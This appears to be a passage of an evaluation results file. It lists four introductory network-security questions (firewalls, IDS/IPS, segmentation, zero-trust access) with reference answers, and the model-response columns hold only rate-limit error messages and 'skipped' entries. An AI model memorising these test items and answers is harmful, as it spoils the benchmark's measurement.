+42,How does a Stateful Inspection Firewall differ from a Packet Filtering Firewall?,"A Stateful Inspection Firewall tracks the state of active connections and makes filtering decisions based on context, whereas a Packet Filtering Firewall inspects packets at the network layer and filters based on IP addresses, port numbers, and protocols.",,,,,,,"Error code: 429 - {'error': {'message': 'Rate limit reached for model `openai/gpt-oss-20b` in organization `org_01kstjnf3kfhzsy8phd3g1g2sc` service tier `on_demand` on tokens per day (TPD): Limit 200000, Used 197161, Requested 3234. Please try again in 2m50.64s. Need more tokens? Upgrade to Dev Tier today at https://console.groq.com/settings/billing', 'type': 'tokens', 'code': 'rate_limit_exceeded'}}",,,,,,,skipped (model not loaded)
+43,What is the main difference between an Intrusion Detection System (IDS) and an Intrusion Prevention System (IPS)?,"An IDS logs and alerts on threats, whereas an IPS actively blocks them.",,,,,,,"Error code: 429 - {'error': {'message': 'Rate limit reached for model `openai/gpt-oss-20b` in organization `org_01kstjnf3kfhzsy8phd3g1g2sc` service tier `on_demand` on tokens per day (TPD): Limit 200000, Used 197158, Requested 3209. Please try again in 2m38.544s. Need more tokens? Upgrade to Dev Tier today at https://console.groq.com/settings/billing', 'type': 'tokens', 'code': 'rate_limit_exceeded'}}",,,,,,,skipped (model not loaded)
+44,Why is network segmentation important in network security?,"Network segmentation divides a network into smaller sub-networks (VLANs or subnets) to limit the blast radius of a breach, thereby reducing the impact of a potential security incident.",,,,,,,"Error code: 429 - {'error': {'message': 'Rate limit reached for model `openai/gpt-oss-20b` in organization `org_01kstjnf3kfhzsy8phd3g1g2sc` service tier `on_demand` on tokens per day (TPD): Limit 200000, Used 197156, Requested 3051. Please try again in 1m29.424s. Need more tokens? Upgrade to Dev Tier today at https://console.groq.com/settings/billing', 'type': 'tokens', 'code': 'rate_limit_exceeded'}}",,,,,,,skipped (model not loaded)
+45,What is the primary advantage of a Modern Zero-Trust Network Architecture (ZTNA) over traditional VPN models?,"A ZTNA applies continuous verification rather than implicit trust within the network perimeter, providing a more secure and dynamic approach to network access control.",,,,,,,"Error code: 429 - {'error': {'message': 'Rate limit reached for model `openai/gpt-oss-20b` in organization `org_01kstjnf3kfhzsy8phd3g1g2sc` service tier `on_demand` on tokens per day (TPD): Limit 200000, Used 197155, Requested 3164. Please try again in 2m17.808s. Need more tokens? Upgrade to Dev Tier today at https://console.groq.com/settings/billing', 'type': 'tokens', 'code': 'rate_limit_exceeded'}}",,,,,,,skipped (model not loaded)
